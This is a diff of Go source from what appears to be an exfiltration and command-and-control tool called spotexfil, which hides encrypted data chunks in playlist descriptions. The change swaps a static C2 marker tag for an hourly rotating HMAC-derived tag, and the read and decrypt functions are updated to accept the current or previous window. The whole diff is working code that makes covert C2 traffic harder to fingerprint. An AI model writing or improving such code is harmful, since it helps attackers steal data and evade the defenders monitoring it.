@@ -2,24 +2,47 @@ package protocol
 
 import (
 	"encoding/base64"
+	"encoding/binary"
 	"encoding/json"
 	"fmt"
 	"html"
 	"sort"
 	"strings"
+	"time"
 
 	"github.com/sourcefrenchy/spotexfil/internal/crypto"
 	"github.com/sourcefrenchy/spotexfil/internal/shared"
 )
 
-// ComputeC2Tag derives a 12-char hex tag from the encryption key.
-// Used to identify C2 playlists without decrypting every playlist.
+// ComputeC2Tag derives a time-windowed 12-char hex tag from the encryption key.
+// The tag rotates every hour: tag = HMAC-SHA256(key, floor(epoch/3600))[:12].
+// Use this for WRITE operations (current window only).
 func ComputeC2Tag(encryptionKey string) string {
+	window := time.Now().Unix() / 3600
+	windowBytes := make([]byte, 8)
+	binary.BigEndian.PutUint64(windowBytes, uint64(window))
 	fullHex := crypto.ComputeHMACSHA256Hex(
 		[]byte(encryptionKey),
-		[]byte(shared.Proto.C2.TagLabel),
+		windowBytes,
 	)
 	return fullHex[:shared.Proto.C2.TagLen]
+}
+
+// ComputeC2Tags returns [current, previous] hour-window tags for READ operations.
+// Checking both windows handles clock skew at the hour boundary.
+func ComputeC2Tags(encryptionKey string) [2]string {
+	now := time.Now().Unix() / 3600
+	var tags [2]string
+	for i, window := range []int64{now, now - 1} {
+		windowBytes := make([]byte, 8)
+		binary.BigEndian.PutUint64(windowBytes, uint64(window))
+		fullHex := crypto.ComputeHMACSHA256Hex(
+			[]byte(encryptionKey),
+			windowBytes,
+		)
+		tags[i] = fullHex[:shared.Proto.C2.TagLen]
+	}
+	return tags
 }
 
 // DeriveMetaKey derives a fast AES key for metadata encryption.
@@ -60,7 +83,7 @@ func EncryptChunkDesc(meta map[string]interface{}, chunkData, encryptionKey stri
 
 // DecryptChunkDesc decrypts a playlist description to extract metadata and chunk.
 func DecryptChunkDesc(description, encryptionKey string) (map[string]interface{}, string, error) {
-	expectedTag := ComputeC2Tag(encryptionKey)
+	tags := ComputeC2Tags(encryptionKey)
 	tagLen := shared.Proto.C2.TagLen
 
 	if len(description) < tagLen {
@@ -68,7 +91,7 @@ func DecryptChunkDesc(description, encryptionKey string) (map[string]interface{}
 	}
 
 	actualTag := description[:tagLen]
-	if actualTag != expectedTag {
+	if actualTag != tags[0] && actualTag != tags[1] {
 		return nil, "", fmt.Errorf("C2 tag mismatch")
 	}
 
@@ -156,14 +179,14 @@ type ChunkMeta struct {
 // ReadC2Descriptions decrypts and filters C2 playlist descriptions.
 // Returns a map of seq -> []ChunkMeta.
 func ReadC2Descriptions(descriptions []DescPair, encryptionKey string, channel string, seq int) map[int][]ChunkMeta {
-	tag := ComputeC2Tag(encryptionKey)
+	tags := ComputeC2Tags(encryptionKey)
 	seqGroups := make(map[int][]ChunkMeta)
 
 	for _, dp := range descriptions {
 		desc := html.UnescapeString(dp.Description)
 
-		// Fast tag check
-		if !strings.HasPrefix(desc, tag) {
+		// Fast tag check (current or previous hour window)
+		if !strings.HasPrefix(desc, tags[0]) && !strings.HasPrefix(desc, tags[1]) {
 			continue
 		}
 
